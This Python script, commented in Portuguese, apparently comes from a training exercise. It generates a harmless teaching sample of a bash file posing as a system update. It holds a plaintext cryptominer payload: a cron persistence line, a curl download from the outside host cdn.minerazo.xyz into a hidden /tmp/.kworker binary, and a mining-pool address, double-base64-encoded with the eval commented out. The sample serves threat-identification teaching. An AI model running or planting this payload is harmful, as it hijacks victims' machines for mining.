#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Gera a amostra didatica do Caso 008: um script que se disfarca de
# "atualizacao do sistema" mas, na verdade, instala um CRYPTOMINER.
# INOFENSIVO: nada e executado. O payload fica codificado em base64 de camada
# dupla so para o aluno treinar a decodificacao e identificar a ameaca.
#
# Diferente do Caso 008 (backdoor com injecao + C2 beacon): aqui a ameaca e
# sequestro de recursos (mineracao), com persistencia via cron e um pool.
import base64

# A "intencao" escondida: agenda um minerador no cron e baixa o binario.
# E so texto para o aluno revelar; o script NAO roda isso.
PAYLOAD = ("(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.kworker "
           "-o stratum+tcp://pool.minerazo.xyz:3333') | crontab - && "
           "curl -s http://cdn.minerazo.xyz/x -o /tmp/.kworker && chmod +x /tmp/.kworker")

blob = base64.b64encode(base64.b64encode(PAYLOAD.encode())).decode()

script = """#!/bin/bash
# atualizacao_sistema.sh  --  amostra didatica da Panthera Quarentena (Caso 008) - INOFENSIVA.
# Encontrado rodando num servidor que andava estranhamente lento.
# Se passa por "atualizacao", mas carrega um estagio escondido. NADA e executado aqui.

STAGE2="%s"

# No malware de verdade, a linha abaixo rodaria o estagio escondido:
#   eval "$(echo "$STAGE2" | base64 -d | base64 -d)"
# (repare na decodificacao em DUAS camadas de base64)

echo "Amostra didatica da Panthera Quarentena. Nenhuma atualizacao, nada foi executado."
""" % blob

with open("atualizacao_sistema.sh", "w", encoding="utf-8") as f:
    f.write(script)

print("gerado atualizacao_sistema.sh (cryptominer em base64 duplo, %d bytes)" % len(blob))
